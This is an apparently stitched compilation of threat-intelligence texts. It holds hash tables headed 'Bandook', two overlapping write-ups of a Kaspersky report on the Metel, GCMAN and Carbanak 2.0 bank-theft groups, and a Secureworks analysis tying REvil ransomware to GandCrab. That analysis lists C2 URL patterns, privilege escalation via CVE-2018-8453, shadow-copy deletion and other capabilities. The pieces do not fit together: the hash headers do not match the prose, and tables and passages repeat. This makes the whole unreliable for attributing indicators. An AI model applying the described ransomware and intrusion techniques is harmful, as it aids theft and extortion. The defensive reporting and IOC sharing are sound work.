7c15ee5b9a12dacaace8fb62271f12f1	154c16ecfa56b71ce7b6f3fca4be4e0820e34665	072c103759968253b7b25837b43eec546c625ae9c04edd52321d848cf6078b87
4e9e12c98cfbc5f3aa3c1345bd063fa0	1e45d9c3ff9bb7e2ed236384694237dcd956de2b	0750c7cdc538d79d9ffed0d37f5d9a083902b49ec02d75ee88028db9f3668b59
7ef261c151519e66ec369c63e4b1aed4	788489ecd0e43f74c7d8df841bee8367cba2164d	40cc5933e608f7a2a5c13af1066257c9e41528bb85e434e2bc3d1f4802dec24d
6effed1b1bb5e9ed6aafacb075c1d4e2	8790c9c1ffdf7ce7d7c1a0825a73ef75958fd9c5	5900abb869c61928f0ef931d6f9d8b62183b2bab9a69b0ef886551005d6c9622
0475771b8bc3efc28b1834f3add608f3	9087c24b181d58bb57d02a1ce19f8d17d63476b4	8cb1f713761a6b31c9c25dd2c7ae11e575a634c9f052cfd598ada35a61783230
045ce6679ed4086e2ded58470e24c15a	9b47ab36a00d83c119620318e4924ce50cec2512	2ee74ae5b202c8aab288ca167c630e9ee3569240958e984474b960cd560bbe95
28ad9ace11919b57bf540e2b9debf8dd	9d0deca8dbdf25bdb9208772f861c28aa5a4e95f	d217288a046e2739159d0081608a44c2e79d41de12c57ebe88a8591693fa15d5
5a3f7c46748791494e29383d1f58a908	a8f2b1f1a1200d25d751b5559a31c034781ea33e	a9a8b0aa5f137e7353db62dc1609da3c709ca30287a5605c73aafaf4968d1e8d
07776b2dd00bcd0be1c7713c37d41120	b0d64b13407da0c6db1aced2d9e110802c05a6d3	6287fc617ff6881169990e6b877c16d8ca3c199f7e453241a0b18a7907c67ab0
d22b31848b6f17efc87d538dede2f2a7	c4d7332f09c7e917d5dd56930854e735cfce45fa	9de287f9af63f02c51c69d9c8480fee2bd4d4bd3c818f2ba81324b1f8ce495c0
b9b8d6f46ff3a9058ffe4b304604b4e7	cf96410d1cde40aaebfe32f26354282a7773abaf	306238a63896fa8b79b4c9a6d25fd906bb9e4919bc698608ab970677d15b0694
573c7dbf4d3aed421bff58df770610fe	d6b69cb3689341997d93b03fbd4499fe60f29b35	1b0d2d096c5f7fff02a5a4ce623b71b862f63e306a0760722f710c425b4e16ec
f037f3961f7d9fe1eb7afa889b556cb1	49a8149054440e33a6228b42f731e2f8035049e5	9a0ee2430f7c77942d544dad6787ca8a94470f6555f1cb08baa9d099c92f8447
Bandook
Slim Version

MD5	SHA-1	SHA-256
1a3889ded73044f8ba0a00c2f089a3bd	03508cbeec86346d6658da8c9d34638c57dad920	766917fe9b543bf218bd824d55967d63f94b28456f1d4919bc990d8262dc608d
70ff19341dee7973ea6dd8e15c6ba86f	9e33cbc25a8ad9987f88d5e1d181098142579f54	d4cf5c5c60e972cc19782d1f37ec9d47dd1e81cdf481b64dab62f96bac846bb4
d6e524514e0d112015c841b62377d648	a31296f1eed15262f070abb3e89acf1a3917746a	6af6fe3eafd4cf2c82738d45a6a95577d970f3fbbe094afd24d1d4a0bb5ad1b4
3f310215a70d748f9335c767e61a2ab4	47b8d74725f353dad8177c478ffa77d424e9a34e	9a19522b23acfc6705e4fac65640527a8adbbc9719dab436f28101b6cbc140c6
bca04d74261fedfbd191ffd5e7cf6214	f6b1b3fc532b516366de6b3452b5c23441386e17	97ea91fb673f4994da491433751c4fca011993ba10191f09c70ca6c8d2b4f944
Full Version

MD5	SHA-1	SHA-256
d1600f45005aa8b8fcbb446f34f7b9f5	816b2442c17585396b73b54fbc87be624d55276c	06ed3daccfbb30c68a33583a761fc20cc3e21adb8dd64a42d922e6da2a01c0dd
4d7e67ed02713c789336f8804231b1ca	424e3570f36fdb541e9b49f9d6824949ccf96ea6	27c6341554a04bdc792ffbc5cda26511cbcfcc66334fb6ebbc24a14969b4e498
9bcf889b14968c61df95961a161719ba	b1604a158cdd24182d8d4198fb17f4d348b92601	3fda0a5da313886b0339eee65c69c779ed620b303ba079ee0864ca4a1496b0b4
54ad403349831b175a98a429f818f02a	8c4d5618c3ab2d2411ede54f443560891a78986b	408c11caf548048732ac21e88a54e80d47a05b9619c1c16b65fa850e0172f428
83311c960609418d5f0a5160324ceb1d	7f534338d1399221bb2134d917a1e3eef8b309e5	41ccf6de0d51bd29d35be12ae24f04b2f88ec2b202b239424f90c666d25473e8
96f09c5c56f59c733d1a9b01fea0cfb4	7e9fcbd7f31c3a4ddb3221351e8d04ecdce69474	66c86f29afb1152aad8e426ebb6569ad03ce7b69ea3c8a5cc40011c2a3ab973b
b5138c77983dba10c4976c411161bbf9	57c9411b444ce4fddf6ddf210dd7dfd008c156ac	aa868d007c4dfd825104faafb3798b9ab745b29794a57365bef41ec3f6019eea
53b7bdd75776f342bf5f5395d4c46520	8971b585f8bf7d9f086d97d2d640ed4ce7f6b178	add9f9dca97c3b6d52efe7d48ecd3d349a70411eaa3d4aeff6e6215b77f42b90
07111aff7afc052a81f267ea2e83dcef	e98700d562edb0ed29e429d0263ec448daf8a5f2	aed7ab5d0de01c3724c917c034e26a5e9eed3f7fbf4082b024576a41725d66cf
eb402e8dd2cae58476acc8e697ee7171	55d1a679ae7e812d5c91ef78bec4095a2048427c	ba153e449ee926c019b548997c32d0579b9c6f350b1590a025d5d9a216ddbffd
cfea49c577ef865de659d5b8025db3f9	99e724a6941c65eed20ac13c4940e325fd323082	ce8ad96819c814dd1735e621639a8845ae7132375879cc5b5d5f6877cb909a68
17fe9611ea566887b3ef42284f96de03	aad7ec556d8d6e4333552d23588734d339373ab8	ea4792353e0f97968e7c69ffba81c144f22f54382af4e61a1347edd0ae15830f
Malware Hunter Team Samples

MD5	SHA-1	SHA-256
d1600f45005aa8b8fcbb446f34f7b9f5	816b2442c17585396b73b54fbc87be624d55276c	06ed3daccfbb30c68a33583a761fc20cc3e21adb8dd64a42d922e6da2a01c0dd
4d7e67ed02713c789336f8804231b1ca	424e3570f36fdb541e9b49f9d6824949ccf96ea6	27c6341554a04bdc792ffbc5cda26511cbcfcc66334fb6ebbc24a14969b4e498
9bcf889b14968c61df95961a161719ba	b1604a158cdd24182d8d4198fb17f4d348b92601	3fda0a5da313886b0339eee65c69c779ed620b303ba079ee0864ca4a1496b0b4
54ad403349831b175a98a429f818f02a	8c4d5618c3ab2d2411ede54f443560891a78986b	408c11caf548048732ac21e88a54e80d47a05b9619c1c16b65fa850e0172f428
83311c960609418d5f0a5160324ceb1d	7f534338d1399221bb2134d917a1e3eef8b309e5	41ccf6de0d51bd29d35be12ae24f04b2f88ec2b202b239424f90c666d25473e8
96f09c5c56f59c733d1a9b01fea0cfb4	7e9fcbd7f31c3a4ddb3221351e8d04ecdce69474	66c86f29afb1152aad8e426ebb6569ad03ce7b69ea3c8a5cc40011c2a3ab973b
b5138c77983dba10c4976c411161bbf9	57c9411b444ce4fddf6ddf210dd7dfd008c156ac	aa868d007c4dfd825104faafb3798b9ab745b29794a57365bef41ec3f6019eea
53b7bdd75776f342bf5f5395d4c46520	8971b585f8bf7d9f086d97d2d640ed4ce7f6b178	add9f9dca97c3b6d52efe7d48ecd3d349a70411eaa3d4aeff6e6215b77f42b90
07111aff7afc052a81f267ea2e83dcef	e98700d562edb0ed29e429d0263ec448daf8a5f2	aed7ab5d0de01c3724c917c034e26a5e9eed3f7fbf4082b024576a41725d66cf
eb402e8dd2cae58476acc8e697ee7171	55d1a679ae7e812d5c91ef78bec4095a2048427c	ba153e449ee926c019b548997c32d0579b9c6f350b1590a025d5d9a216ddbffd
cfea49c577ef865de659d5b8025db3f9	99e724a6941c65eed20ac13c4940e325fd323082	ce8ad96819c814dd1735e621639a8845ae7132375879cc5b5d5f6877cb909a68
17fe9611ea566887b3ef42284f96de03	aad7ec556d8d6e4333552d23588734d339373ab8	ea4792353e0f97968e7c69ffba81c144f22f54382af4e61a1347edd0ae15830f
Introduction
In late 2014, Kaspersky Lab researchers made a worrying prediction: financially-motivated cyber-criminals would adopt sophisticated tactics and techniques from APT groups for use in bank robberies. Just a few months later, in February 2015, we announced the discovery of Carbanak, a cyber-criminal gang that used custom malware and APT techniques to steal millions of dollars while infecting hundreds of financial institutions in at least 30 countries. Since then, we have seen an increase in these covert, APT-style attacks that combine the use of reconnaissance, social engineering, specialized malware, lateral movement tools and long-term persistence to steal money from financial institutions (particularly ATMs and money transfer systems). Today at the Security Analyst Summit (SAS 2016), Kaspersky Lab is announcing the discovery of two new gangs engaged in APT-style bank robberies – Metel and GCMAN – and the reemergence of the Carbanak group with new targets in its sights. In 2015, Kaspersky Lab researchers conducted Incident Response for 29 organizations located in Russia and infected by these three groups.

Due to the active nature of law enforcement investigations and non-disclosure agreements with victim organizations, Kaspersky Lab cannot provide extensive details of the attacks. Kaspersky Lab is releasing crucial Indicators of Compromise (IOCs) and other data to help organizations search for traces of these attack groups in their corporate networks (see below). The story of Metel – ATM balance rollbacks
In summer 2015, a bank in Russia discovered it had lost millions of rubles in a single night through a series of strange financial transactions. The bank’s clients were making withdrawals from ATMs belonging to other banks and were able to cash out huge sums of money while their balances remained untouched. The victim bank didn’t realize this until it tried to recoup the money withdrawn from the other banks’ ATMs. During our incident response, we discovered the solution to this puzzle: Metel, a modular malware program also known as Corkow.

The malware, used exclusively by the Metel group, infected the bank’s corporate network via e-mail and moved laterally to gain access to the computers within the bank’s IT systems. Having gained access to the bank operator’s money-processing system, the gang pulled off a clever trick by automating the rollback of ATM transactions. This meant that money could be stolen from ATM machines via debit cards while the balance on the cards remained the same, allowing for multiple transactions at different ATM machines. APT-style bank robberies increase with Metel, GCMAN and Carbanak 2.0 attacks

Encrypted configuration for Metel malware plugins

Our investigations revealed that the attackers drove around several cities in Russia, stealing money from ATMs belonging to different banks. With the automated rollback in place the money was instantly returned to the account after the cash had been dispensed from the ATM. The group worked exclusively at night, emptying ATM cassettes at several locations.

In all, we discovered Metel in more than 30 financial institutions, but Kaspersky Lab’s incident responders were able to clean the networks before any major damage could be done. It is highly likely that this threat is far more widespread and we urge financial institutions around the world to scan their networks for signs of the Metel malware. The Metel criminal group is still active. At the moment, we don’t have any information about any victims outside Russia. Comix-Hack-Second

GCMAN – penetration testing tools gone bad
A second group, which we call GCMAN because the malware is based on code compiled on the GCC compiler, emerged recently using similar techniques to the Metel Group to infect banking institutions and attempt to transfer money to e-currency services. The initial infection mechanism is handled by spear-phishing financial institution targets with e-mails carrying a malicious RAR archive to. Upon opening the RAR archive, an executable is started instead of a Microsoft Word document, resulting in infection.

GCMAN

Once inside the network, the GCMAN group uses legitimate and penetration testing tools such as Putty, VNC, and Meterpreter for lateral movement. Our investigation revealed an attack where the group then planted a cron script into bank’s server, sending financial transactions at the rate of $200 per minute. A time-based scheduler was invoking the script every minute to post new transactions directly to upstream payment processing system. This allowed the group to transfer money to multiple e-currency services without these transactions being reported to any system inside the bank. APT-style bank robberies increase with Metel, GCMAN and Carbanak 2.0 attacks

Decompiled code of GCMAN malware that is responsible for connecting to CnC

In a stroke of luck, the financial institutions discovered the suspicious activity on their network in time to neutralize the threat and cancel the transactions. One interesting observation is that the real attack happened approximately 18 months before it was discovered.

The group used an MS SQL injection in commercial software running on one of bank’s public web services, and about a year and a half later, they came back to cash out. During that time they poked 70 internal hosts, compromised 56 accounts, making their way from 139 attack sources (TOR and compromised home routers). We discovered that about two months before the incident someone was trying different passwords for an admin account on a banking server. They were really persistent but doing it only three times a week and then only on Saturdays, in an effort to stay under the radar. Kaspersky Lab’s research team responded to three financial institutions in Russia that were infected with the GCMAN malware. It is likely that this threat is far more widespread and we urge banks to sweep their networks for signs of this cyber-criminal group. Carbanak 2.0: new targets beyond banks
After our exposure of the Carbanak group exactly a year ago, the group disappeared for about five months, leading us to believe that the operation was disbanded.

However, in September last year, our friends at CSIS published a blog detailing a new Carbanak variant affecting one of its customers. In December 2015, we confirmed that the group was still active. Kaspersky Lab discovered signs of Carbanak in two institutions – a telecommunications company and a financial institution. APT-style bank robberies increase with Metel, GCMAN and Carbanak 2.0 attacks

Executable files founded in SHIM during Carbanak incident response

One interesting characteristic of Carbanak 2.0 is a different victim profile. The group has moved beyond banks and is now targeting the budgeting and accounting departments in any organization of interest to them, using the same APT-style tools and techniques. inf_Carbanak2

In one remarkable case, the Carbanak 2.0 gang used its access to a financial institution that stores information about shareholders to change the ownership details of a large company. The information was modified to name a money mule as a shareholder of the company, displaying their IDs.

It’s unclear how they wanted to make use of this information in future. Kaspersky Lab products successfully detect and block the malware used by the Carbanak 2.0, Metel and GCMAN threat actors with the following detection names:

Trojan-Dropper.Win32.Metel
Backdoor.Win32.Metel
Trojan-Banker.Win32.Metel
Backdoor.Win32.GCMan
Backdoor.Win64.GCMan
Trojan-Downloader.Win32.GCMan
Trojan-Downloader.Win32.Carbanak
Backdoor.Win32.Carbanak
Kaspersky Lab urges all organizations to carefully scan their networks for the presence of Carbanak, Metel and GCMAN and, if detected, to disinfect their systems/computers/networks and report the intrusion to law enforcement. All this information has been made available to customers of our APT intelligence reporting service and they received the indicators of compromise and context information as soon as they became available. At the end of 2015, the Global Research and Analysis (GReAT) Team made a series of predictions, envisioning the future IT security situation in 2016. Of course, these predictions were not wild guesses or magical divinations: they were grounded in continuous surveillance of the worldwide threat landscape and in ongoing research.

To illustrate this, we are going to speak about three out-of-the-ordinary cyberheists: two conducted by actors quite new to us, and a third the production of an old acquaintance. But – let’s start with the first. Metel: rolling stolen money back
In the summer of 2015, our Emergency Response Team received a call from a Russian bank. The callers reported a loss of money due to mysterious financial transactions, the origins of which they were unable to trace. Kaspersky Lab’s experts responded rapidly – and were able to locate the root cause: a piece of malware based on  the well-known Corkow Trojan, which we dubbed Metel (or ‘Snowstorm’ in Russian – O.G.). The investigation uncovered a cybercriminal operation using an innovative technique, allowing them to freely tap into the banknote storages of public ATMs for multiple banks, which they then visited nocturnally by car. The transactions, conducted using the compromised bank’s own plastic cards, were automatically refunded via the hacked interface of an infected support center machine.

Further research proved that Metel operators achieved their initial infection through specially crafted spear-phishing emails with malicious attachments, and through the Niteris exploit pack, targeting vulnerabilities in the victim’s browser. Demonstrating that the launch of a successful Targeted Attack does not mean having to write a lot of malware modules, the cybercriminals used legitimate pentesting tools, including Mimikatz, to obtain Admin credentials, which were siezed after luring administrators onto compromised machines by crashing arbitrary applications. With admin rights, it was much easier for them to move laterally, hijack the local Domain Controller and eventually locate and gain control over support computers. Following the initial discovery, Kaspersky Lab found Metel malware lodged in IT networks of several more banks. Fortunately, they were able to cleanse the infection before major damage could occur. Still, there are grounds to suspect that the infection is much more widespread, and banks around the world are recommended to check for infection proactively, using the Indicators of Compromise (IoCs) provided – or contact the Kaspersky Lab specialists for a more thorough search.

GCMan: The Money Ping
Another bank contacting Kaspersky Lab’s emergency team claimed they were losing the equivalent of $200 a minute through an unidentified channel. Our cyberdetectives investigated the ‘crime-scene’ and found malware sitting alongside a number of legitimate and pentesting tools (including Putty, VNC and Meterpreter). The primary malware was compiled using a Linux-native GCC compiler – hence the ‘GCMan’ nickname. Using techniques very similar to those of Metel, GCMan gained a foothold inside the bank’s security perimeter with the help of spear-phishing emails and malicious attachments. It then explored the network, located the server responsible for financial transactions and set up a scheduling script which started sending a $200-‘pings’ to multiple e-currency systems, without reporting the transactions or triggering any alarms. A stroke of luck – and help from the Kaspersky Lab specialists – allowed the bank to identify suspicious network activity and to locate and cancel the unwanted transactions.

All the same, it’s worth noting that the initial infection occurred more than 18 months before the ‘money pings’ started. During that time, the attackers kept a low profile, gradually expanding their control over the network and building the basis for their subsequent criminal operation; 70 hosts and 56 accounts were compromised using the total of 139 auxiliary attack sources (including Tor network and compromised SOHO routers). Several more financial institutions contacted  Kaspersky Lab with incidents which subsequently proved connected to GCMan. But there is a reason to assume that infiltration was much more widespread – so don’t hesitate to check proactively for attack indicators. GCMan may move slowly – but it can start syphoning off funds at any time. Carbanak 2.0: expanding the boundaries of crime
Those guys who made many a banker turn grey by stealing a total of near $1 bln last year are back! After the initial operation, they faded into the shadows for several months – but in September 2015, our colleagues from CSIS discovered a new variant of their malware during an incident investigation.

In December 2015, Kaspersky Lab’s GReAT experts confirmed that the group is still active despite all the rumors of retirement. As part of a new wave of operations, they expanded their choice of victims, targeting the accounting and budgetary divisions of a wide range of companies. In one case, they even attempted to forge information proving that their accomplice was one of the enterprise’s shareholders. It remains unclear how they intended to use this information in the future. Carbanak’s initial series of attacks were noted for their wide use of legitimate tools – and even built-in administrative interfaces – to achieve their goals. Their second iteration was similar: besides renewing their backdoor module, they used pentesting tools such as Meterpreter and a number of legitimate Remote Administration Tools, including the same AMMYY Admin as was used during their first appearance. Less malware: more legitimate software – plus extensive testing
These three cases beautifully illustrate one important trend in the perpetration of targeted attacks.

Why write a lot of custom malware tools, when legitimate utilities can be just as effective, and trigger far fewer alarms? The necessary efficiency can be attained through testing against the supposed target’s IT security simulacrum – and subsequent tweaking the attack scheme. Such a situation merits extra attention to your current security posture: some aspects definitely need reviewing. Addressing the issue
The first thing to be done, given the story above, is to review alarms triggered by different types of ‘Riskware’, such as Remote Administration Tools: they demand your special attention. But, of course, this alone is not enough; according to the ASD’s comprehensive Targeted Attack Mitigation Strategies, policing the launched application using allowlists is one of the Top 4 approaches, effective in 85% of reported TA-related security breaches. In the case of financial institutions, the price of a security breach can be incredibly high: besides the simple matter of money, hundreds of thousands of customer datasets can be endangered.

So it’s well worth considering the  adoption of a Default Deny  Application Control scenario for all those workstations which perform only a limited number of tasks –Customer Support operators’ or Accountants’ PCs, for example. This prevents the majority of file-based malware from launching, letting only allowed applications run. Policing internet access reduces the risk even further: many workstations don’t need to undertake web browsing – and the rest can be restricted to safer web resources by using Web Control. And Device Control would restrict the use of portable storages, which can serve both as infection vectors and data leakage media. But even such potent technologies as allowlists and Default Deny cannot be considered a complete panacea. Attackers are not stupid, and keep inventing new tricks to sidestep them: GCMan, for example, employs a number of powershell scripts to confuse different implementations of Default Deny – so extra security layers are also needed.

Security Controls are part of Kaspersky Endpoint Security for Business, a true multi-layered security powerhouse comprising a plethora of constantly improved leading-edge technologies to guard the most vulnerable element of the IT network – the endpoint. Of course, just offering a multitude of powerful endpoint security layers is not enough. Spear-phishing, one of the most popular techniques for initial infection, makes reliable mail security a must. Kaspersky Security for Mail Servers scans incoming emails for both malicious attachments and URLs, significantly reducing the chances of malware reaching its victims. In the light of the stories above, you may want to consider ordering a proactive inspection of your IT infrastructure for the presence of Targeted Attacks. Our Kaspersky Targeted Attack Discovery[1] service employs the best cyberdetectives armed with the most extensive security intelligence to uncover and help neutralize even the most complicated Targeted Attacks. From ancient times, the banking business has been associated with the danger of theft.

The advance of technology has provided criminals with extra opportunities – and in the Digital Age, such opportunities have become a Sword of Damocles hanging over financial institutions. There really is good reason to adjust your IT security strategy right now.

On May 31, 2019, the developers of the highly profitable GandCrab 'ransomware-as-a-service' announced that they were retiring after earning over $2 billion USD since January 2018. The news was met with interest and skepticism within the security community, as multiple affiliate groups regularly conducted extremely successful GandCrab campaigns since its inception. After analyzing the threat landscape, Secureworks® Counter Threat Unit™ (CTU) researchers determined that some or all of GandCrab's developers, which the CTU™ research team refers to as GOLD GARDEN, simply shifted their focus to a different ransomware variant. ENTER REVIL
The REvil (also known as Sodinokibi) ransomware was first spotted in the wild (ITW) on April 17, when threat actors leveraged an Oracle WebLogic exploit to deliver both REvil and GandCrab. CTU analysis and tracking of REvil samples suggest that the ransomware was in development and testing between April 10 and May 7 and was not intended for public release.

Following the release of version 1.01 on May 7, the REvil developers, which CTU researchers refer to as GOLD SOUTHFIELD, began pushing a new release of the ransomware at the beginning of each month. The features and modifications of each version are listed in the Appendix of this blog post. As of this publication, August is the only skipped month. This cadence and the ransomware's capabilities indicate a structured development process by dedicated and experienced malware authors. After GOLD GARDEN's retirement announcement, REvil activity increased with expanded delivery methods such as malicious spam campaigns and RDP attacks. This surge suggests that the ransomware operators deemed it ready for public release. On June 20, REvil was leveraged in a strategic web compromise (SWC) against the Italian WinRAR . it website, replacing the WinRAR installation executable with an instance of the malware to infect customers' systems. On the same day, threat actors breached at least three managed service providers (MSPs) and used the access to deploy REvil to the MSPs' customers.

Other high-profile supply-chain attacks involving REvil have impacted 22 Texas municipalities and hundreds of dentist offices in the United States. Figure 1 shows a timeline of REvil releases and malicious activity. Figure 1. Timeline of REvil activity before and after GOLD GARDEN's retirement announcement. (Source: Secureworks)

CONNECTING THE DOTS
Numerous characteristics indicate that the same developers were involved in producing GandCrab and REvil, suggesting a connection between members of the GOLD GARDEN and GOLD SOUTHFIELD threat groups. In a technical analysis of REvil version 1.01, CTU researchers identified possible overlap between REvil and GandCrab. Even the earliest identified REvil sample (REvil Beta) included elements that appear to refer to GandCrab. NEARLY IDENTICAL STRING DECODING FUNCTION
CTU researchers found that the string decoding functions employed by REvil and GandCrab are nearly identical. Because malware authors typically implement custom encoding/decoding logic in their malware, the code can be used as a fingerprint to identify other samples associated with the malware family.

When analyzing REvil, CTU researchers identified and extracted a portion of the opcodes (outlined in red in Figure 2) associated with its string decoding function. Figure 2. Opcodes for FOR-loop within REvil and GandCrab string decoder function. (Source: Secureworks)

When searching VirusTotal for samples containing this opcode pattern, 286 unique samples were identified. Further analysis of all 286 samples were confirmed to be either GandCrab or REvil (including REvil's decryptor). CTU researchers have not identified other malware families using this opcode pattern as of this publication, supporting the theory that these malware families share code. SIMILAR URL BUILDING LOGIC
REvil 1.00 implements URL building functionality that produces the same command and control (C2) URL pattern as GandCrab. The C2 URLs for both families consist of two URI subpaths followed by a randomly generated resource name and an extension (see Figure 3). The subpath names and extension are retrieved from the hard-coded values listed in Table 1.

Figure 3. Example C2 server URLs. (Source: Secureworks)

Values for first subpath	Values for second subpath	Extensions for resource
wp-content
static
content
include
uploads
news
data
admin

images
pictures
image
temp
tmp
graphic
assets
pics
game

.jpg
.png
.gif
.bmp

Table 1. Hard-coded values for REvil and GandCrab C2 URLs. While technically it would be possible for an unaffiliated threat actor to reproduce this logic within a separate malware family, doing so with such accuracy would require the threat actor to reverse engineer a GandCrab sample. Given the level of effort requires and the insignificant nature of the URI pattern, it is more likely that code originally created for GandCrab was repurposed in REvil. HINTS AT GANDCRAB VERSION 6
CTU analysis of the REvil Beta sample revealed two findings that are significant in proving a link between GandCrab and this first-identified version of REvil:

gcfin and gc6 debug paths — A debug path is typically created by the integrated development environment (IDE) used by the malware author.

Competent malware authors remove this information prior to distribution, as it could reveal the malware's name or details about the malware author's environment. The REvil Beta sample includes the d:\code\csrc\!1\new_a\gcfin\bin\debug\rwenc_exe_x86_debug.pdb debug path. gcfin is the malware author's name for the development project, and in context with other evidence appears to refer to “GandCrab Final”. Similarly, a discovered REvil file decryptor executable specifies the D:\\gc6\\core\\src\\common\\debug.c debug path. The reference to gc6 in the debug path could be a reference to GandCrab 6, which suggests that REvil was originally intended as GandCrab version 6. REvil version 6.00? — REvil populates a stat JSON data structure with information about the malware and the compromised host. Starting with REvil 1.00, the stat JSON is encrypted and sent to the attacker's C2 server. CTU researchers determined that the integer value assigned to the ver key located within the stat JSON represents the malware version. REvil interprets the value as hexadecimal.

The REvil Beta sample includes the hard-coded value 1536, which converts to hexadecimal is 0x600 and indicates version 6.00. This version does not align with REvil's incremental numbering pattern as the next release is version 1.00, but it would align with the GandCrab numbering pattern given that the last observed version of GandCrab was 5.2. REGION WHITELISTING
Both REvil and GandCrab whitelist similar keyboard locales to prevent infection of Russia-based hosts. Malware authors commonly whitelist regions where they reside to prevent scrutiny from local law enforcement. This similarity does not establish a direct connection between REvil and GandCrab but does indicate that the malware authors likely reside in the same region. CONCLUSION
GandCrab's 'ransomware-as-a-service model' proved to be a highly lucrative endeavor for GOLD GARDEN, so it is unlikely that the threat actors abandoned all malicious activity. Characteristics of REvil that appear to be operational security mistakes by the malware authors enabled CTU researchers to technically link the REvil and GandCrab ransomware families.

This link indicates that the malware authors have shifted their focus from GandCrab to REvil. APPENDIX — REVIL VERSION FEATURES AND MODIFICATIONS
REvil Beta
MD5: bed6fc04aeb785815744706239a1f243
SHA1: 3d0649b5f76dbbff9f86b926afbd18ae028946bf
SHA256: 3641b09bf6eae22579d4fd5aae420476a134f5948966944189a70afd8032cb45

Privilege escalation via CVE-2018-8453 (64-bit only)
Rerun with RunAs to elevate privileges
Implements a requirement that if “exp” is set, privilege escalation must be successful for full execution to occur
Implements target whitelisting using GetKetboardLayoutList
Contains debug console logging functionality
Defines the REvil registry root key as SOFTWARE\!test
Includes two variable placeholders in the ransom note: UID & KEY
Terminates processes specified in the “prc” configuration key prior to encryption
Deletes shadow copies and disables recovery
Wipes contents of folders specified in the "wfld" configuration key prior to encryption
Encrypts all non-whitelisted files on fixed drives
Encrypts all non-whitelisted files on network mapped drives if it is running with System-level privileges or can impersonate the security context of explorer.exe
Partially implements a background image setting to display a basic "Image text" message
Sends encrypted system data to a C2 domain via an HTTPS POST request (URI path building is not implemented.)

REvil 1.00
MD5: 65aa793c000762174b2f86077bdafaea
SHA1: 95a21e764ad0c98ea3d034d293aee5511e7c8457
SHA256: f0c60f62ef9ffc044d0b4aeb8cc26b971236f24a2611cb1be09ff4845c3841bc

Adds 32-bit implementation of CVE-2018-8453 exploit
Removes console debug logging
Changes the REvil registry root key to SOFTWARE\recfg
Removes the System/Impersonation success requirement for encrypting network mapped drives
Adds a "wipe" key to the configuration for optional folder wiping
Fully implements the background image setting and leverages values defined in the “img” configuration key
Adds an EXT variable placeholder to the ransom note to support UID, KEY, and EXT
Implements URI path building so encrypted system data is sent to a C2 pseudo-random URL
Fixes the function that returns the victim's username so the correct value is placed in the stats JSON data

REvil 1.01
MD5: 2abff29b4d87f30f011874b6e98959e9
SHA1: 9d1b61b1cba411ee6d4664ba2561fa59cdb0732c
SHA256: a88e2857a2f3922b44247316642f08ba8665185297e3cd958bbd22a83f380feb

Removes the exp/privilege escalation requirement for full execution and encrypts data regardless of privilege level
Makes encryption of network mapped drives optional by adding the “-nolan” argument

REvil 1.02
MD5: 4af953b20f3a1f165e7cf31d6156c035
SHA1: b859de5ffcb90e4ca8e304d81a4f81e8785bb299
SHA256: 89d80016ff4c6600e8dd8cfad1fa6912af4d21c5457b4e9866d1796939b48dc4

Enhances whitelisting validation by adding inspection of GetUserDefaultUILanguage and GetSystemDefaultUILanguage
Partially implements “lock file” logic by generating a lock filename based on the first four bytes of the Base64-decoded pk key, appending a .lock file extension, and adding the filename to
the list of whitelisted files in the REvil configuration (It does not appear that this value is referenced after it is created and stored in memory.

There is no evidence that a lock file is dropped to disk.)
Enhances folder whitelisting logic that take special considerations if the folder is associated with "program files" directories
Hard-codes whitelisting of all direct content within the Program Files or Program Files x86 directories
Hard-codes whitelisting of "sql" subfolders within program files
Encrypts program files sub-folders that does not contain "sql" in the path
Compares other folders to the list of whitelisted folders specified in the REvil configuration to determine if they are whitelisted
Encodes stored strings used for URI building within the binary and decodes them in memory right before use
Introduces a REvil registry root key "sub_key" registry value containing the attacker's public key

REvil 1.03
MD5: 3cae02306a95564b1fff4ea45a7dfc00
SHA1: 0ce2cae5287a64138d273007b34933362901783d
SHA256: 78fa32f179224c46ae81252c841e75ee4e80b57e6b026d0a05bb07d34ec37bbf

Removes lock file logic that was partially implemented in 1.02
Leverages WMI to continuously monitor for and kill newly launched processes whose names are listed in the prc configuration key (Previous versions performed this action once.)
Encodes stored shellcode
Adds the -path argument:
Does not wipe folders (even if wipe == true)
Does not set desktop background
Does not contact the C2 server (even if net == true)
Encrypts files in the specified folder and drops the ransom note
Changes the REvil registry root key to SOFTWARE\QtProject\OrganizationDefaults
Changes the registry key value names

REvil 1.04
MD5: 6e3efb83299d800edf1624ecbc0665e7
SHA1: 0bd22f204c5373f1a22d9a02c59f69f354a2cc0d
SHA256: 2ca64feaaf5ab6cf96677fbc2bc0e1995b3bc93472d7af884139aa757240e3f6

Leverages PowerShell and WMI to delete shadow copies if the victim's operating system is newer than Windows XP (For Windows XP or older, it uses the original command that was executed in all previous REvil versions.)
Removes the folder wipe capability
Changes the REvil registry root key to SOFTWARE\GitForWindows
Changes the registry key value names

